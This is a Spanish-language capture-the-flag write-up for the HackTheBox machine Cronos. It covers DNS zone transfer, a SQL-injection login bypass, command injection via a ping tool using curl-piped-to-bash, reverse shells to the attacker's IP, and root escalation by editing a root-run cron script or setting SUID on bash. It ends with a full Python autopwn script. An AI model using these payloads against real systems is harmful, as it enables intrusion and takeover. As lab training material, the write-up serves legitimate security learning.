# Cronos

Script que automatiza la intrusion como www-data: [https://pastebin.com/nh9Z8Lb4](https://pastebin.com/nh9Z8Lb4)

# **ENUMERACION**

Realizamos un escaneo de versiones de los puertos abiertos de la maquina:

```bash
❯ nmap -sC -sV -p22,53,80 10.10.10.13 -oN scanports
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-19 11:06 EDT
Nmap scan report for 10.10.10.13
Host is up (0.068s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Como tiene el puerto 53 abierto voy a intuir que se esta realizando Virtual Hosting y voy a agregar el dominio cronos.htb al /etc/hosts . HackTheBox suele hacer mucho esto, poner como dominio el nombre de la maquina terminado en .htb

```bash
❯ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

10.10.10.13     cronos.htb
```

## **TRANSFER ZONE ATTACK**

Realizamos un ataque de transferencia de zona con la herramienta `dig`

```bash
❯ dig @10.10.10.13 cronos.htb axfr

; <<>> DiG 9.16.15-Debian <<>> @10.10.10.13 cronos.htb axfr
; (1 server found)
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
```

Nos reporta varios subdominios existentes, los agregamos al /etc/hosts y le echamos un vistazo

```bash
❯ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

10.10.10.13     cronos.htb admin.cronos.htb www.cronos.htb ns1.cronos.htb
```

```bash
❯ whatweb http://cronos.htb/
http://cronos.htb/ [200 OK] Apache[2.4.18], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], HttpOnly[laravel_session], IP[10.10.10.13], Laravel, Title[Cronos], X-UA-Compatible[IE=edge]
```

## **BYPASS LOGIN SQLi**

![Untitled](Cronos%20c1f6523352f747d1ada44b9a3964fd9f/Untitled.png)

La pagina admin.cronos.htb es vulnerable a inyeccion SQL, por lo que hemos burlado el panel de inicio de sesion:

![Untitled](Cronos%20c1f6523352f747d1ada44b9a3964fd9f/Untitled%201.png)

# **EXPLOTACION**

Nos encontramos con una herramienta que permite hacer un `traceroute` y un `ping`

Podemos intentar abusar de esta forma para inyectar comandos en la maquina, un ejemplo de lo que esta ocurriendo es este:

```bash
❯ cat script.sh
#!/bin/bash

echo "hola me llamo `whoami`"
echo "hola me llamo $(whoami)"
                                                                                                                                                                                                                                           
❯ ./script.sh
hola me llamo root
hola me llamo root
```

![Untitled](Cronos%20c1f6523352f747d1ada44b9a3964fd9f/Untitled%202.png)

```bash
❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
11:21:09.633394 IP 10.10.10.13 > 10.10.16.198: ICMP echo request, id 1737, seq 1, length 64
11:21:09.633408 IP 10.10.16.198 > 10.10.10.13: ICMP echo reply, id 1737, seq 1, length 64
11:21:10.536108 IP 10.10.10.13 > 10.10.16.198: ICMP echo request, id 1737, seq 2, length 64
11:21:10.536122 IP 10.10.16.198 > 10.10.10.13: ICMP echo reply, id 1737, seq 2, length 64
11:21:11.537127 IP 10.10.10.13 > 10.10.16.198: ICMP echo request, id 1737, seq 3, length 64
11:21:11.537141 IP 10.10.16.198 > 10.10.10.13: ICMP echo reply, id 1737, seq 3, length 64
11:21:12.538718 IP 10.10.10.13 > 10.10.16.198: ICMP echo request, id 1737, seq 4, length 64
11:21:12.538736 IP 10.10.16.198 > 10.10.10.13: ICMP echo reply, id 1737, seq 4, length 64
```

Podemos inyectar comandos en esta utilidad, vamos a comprobar si la maquina tiene la herramienta curl:

![Untitled](Cronos%20c1f6523352f747d1ada44b9a3964fd9f/Untitled%203.png)

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.13 - - [19/Aug/2021 11:32:29] "GET / HTTP/1.1" 200 -
```

# **GANANDO ACCESO**

Nos responde, ya solo nos quedaria crearnos un archivo de esta forma:

```bash
❯ cat index.html
#!/bin/bash

bash -i >& /dev/tcp/10.10.16.198/443 0>&1
```

Y montarnos un servidor http con python y hacer un curl hacia nuestra IP y pipearlo con bash:

`$(curl http://10.10.16.198|bash)`

`python3 -m http.server 80`

`nc -nlvp 443`

![Untitled](Cronos%20c1f6523352f747d1ada44b9a3964fd9f/Untitled%204.png)

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.13 - - [19/Aug/2021 11:34:27] "GET / HTTP/1.1" 200 -

───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.198] from (UNKNOWN) [10.10.10.13] 36292
bash: cannot set terminal process group (1369): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cronos:/var/www/admin$
```

Hemos ganado acceso al sistema, ahora nos toca enumerarlo:

Encuentro unas credenciales de mysql en un archivo, pero que al final nos da un hash del usuario admin que no logro crackear:

```bash
www-data@cronos:/var/www/admin$ cat config.php 
<?php
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_DATABASE', 'admin');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>
```

```bash
www-data@cronos:/var/www/admin$ mysql -uadmin -pkEjdbRigfBHUREiNSDs
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 13
Server version: 5.7.17-0ubuntu0.16.04.2 (Ubuntu)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| admin              |
+--------------------+
2 rows in set (0.00 sec)
mysql> use admin;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------+
| Tables_in_admin |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)
mysql> describe users;
+----------+-----------------+------+-----+---------+----------------+
| Field    | Type            | Null | Key | Default | Extra          |
+----------+-----------------+------+-----+---------+----------------+
| id       | int(6) unsigned | NO   | PRI | NULL    | auto_increment |
| username | varchar(30)     | NO   |     | NULL    |                |
| password | varchar(100)    | NO   |     | NULL    |                |
+----------+-----------------+------+-----+---------+----------------+
mysql> select * FROM users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 4f5fffa7b2340178a716e3832451e058 |
+----+----------+----------------------------------+
```

```bash
www-data@cronos:/home/noulis$ cat user.txt 
51d236438b333970dbba7d---------
```

Se me olvidaba la flag xD, esta vez con el usuario www-data podemos ver la flag asi que perfecto, Me paso el `pspy64s` para ver si hay tareas que se ejecutan cada cierto tiempo:

```bash
2021/08/19 19:09:01 CMD: UID=0    PID=20842  | php /var/www/laravel/artisan schedule:run 
2021/08/19 19:09:01 CMD: UID=0    PID=20841  | /bin/sh -c php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

`Pspy` me reporta que lo esta ejecutando root (UID=0) el script /var/www/laravel/artisan

Y tenemos permiso de escritura del script, asi que la escalada es pan comido

```bash
www-data@cronos:/tmp$ ls -la /var/www/laravel/artisan
-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan
```

Abrimos el script y lo modificamos al gusto, en este caso voy a otorgarme una reverse shell:

```php
#!/usr/bin/env php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.198/443 0>&1'");
/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader
<data>
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.198] from (UNKNOWN) [10.10.10.13] 36300
bash: cannot set terminal process group (20922): Inappropriate ioctl for device
bash: no job control in this shell
root@cronos:~#
```

O tambien podriamos hacer esto:

```bash
#!/usr/bin/env php
<?php
exec("chmod 4755 /bin/bash");
/*
|--------------------------------------------------------------------------
| Register The Auto Loader
<data>
```

```bash
www-data@cronos:/tmp$ watch -n 1 ls -la /bin/bash
Every 1.0s: ls -la /bin/bash                                                                                                                                                                                       Thu Aug 19 19:16:48 2021

-rwxr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash

Every 1.0s: ls -la /bin/bash                                                                                                                                                                                       Thu Aug 19 19:17:11 2021

-rwsr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
```

Ahora la bash tiene permisos SUID:

```bash
www-data@cronos:/var/www/laravel$ bash -p
bash-4.3# whoami
root
bash-4.3#
```

Script que automatiza la intrusion como www-data:

```python
#!/usr/bin/python3
#Para su correcto funcionamiento teneis que agregar al /etc/hosts la IP 10.10.10.13 y el dominio admin.cronos.htb
#Uso: python3 autopwn_cronos.py <LHOST>
#Ejemplo : python3 autopwn_cronos 10.10.16.198

import sys
import requests
import time
import subprocess
import os
from pwn import *

signal.signal(signal.SIGINT, signal.SIG_DFL)

#Variables
IP = sys.argv[1]          #LHOST => Ip del atacante
url = "http://admin.cronos.htb/index.php"
url_exec = "http://admin.cronos.htb/welcome.php"
lport = 443
#Funciones
def def_handler(sig, frame):
    print("\n[-]Saliendo....\n")
    sys.exit(1)

def obtainShell():
    try:
        s = requests.Session()
        login_data = {
            'username' : '''admin' or 1=1#''',
            'password' : 'loquesea'
        }
        r = s.post(url, data=login_data)
        data_exec = {
            'command' : 'ping -c 1',
            'host' : '$(curl http://%s|bash)' %IP
        }
        p1 = log.progress("\nCreando archivo index.html con contenido malicioso\n")
        time.sleep(2)
        os.system('echo "#!/bin/bash\n\nbash -i >& /dev/tcp/%s/443 0>&1" > index.html' %IP) 
        p1 = log.progress("\nMontando servidor con Python\n")
        subprocess.Popen(["timeout", "10", "python3", "-m", "http.server", "80"])
        p1 = log.progress("\nEnviando Payload...\n")
        time.sleep(2)
        r = s.post(url_exec, data=data_exec)
        
    except Exception as e:
        print(e)

if __name__ == '__main__':
    try:
        threading.Thread(target=obtainShell).start()
    except Exception as e:
        print(str(e))

    shell = listen(lport, timeout=10).wait_for_connection()

    if shell.sock is None:
        log.failure("[!]No se ha obtenido conexion")
        sys.exit()
    else:
        log.success("\n ✔️  Se ha obtenido una shell ✔️ \n")
        time.sleep(1)
        log.info("\nAcceso como www-data\n")
        time.sleep(1)

    shell.interactive()
```